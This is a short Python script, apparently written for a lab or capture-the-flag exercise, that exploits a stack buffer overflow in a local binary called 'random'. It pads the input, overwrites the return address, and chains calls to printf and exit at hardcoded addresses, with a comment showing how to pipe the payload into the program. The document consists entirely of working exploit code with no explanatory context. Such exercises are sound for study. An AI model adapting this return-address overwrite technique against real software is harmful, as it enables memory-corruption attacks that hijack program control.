#!/usr/bin/python
import struct, sys

def dw(i):
    return struct.pack("<I", i)

#count to ret
pad_count_to_ret = 13
payload = "X" * pad_count_to_ret

#where to return
ret_addr = 0x080484f4
payload += dw(ret_addr)

#attack
exit_addr = 0x804857f
printf_addr = 0x080483b0
payload += dw(printf_addr) + dw(exit_addr) + dw(0x8048660) + dw(12345678)

sys.stdout.write(payload)

###
# How to run exploit
# python exploit.py | ../src/random
###
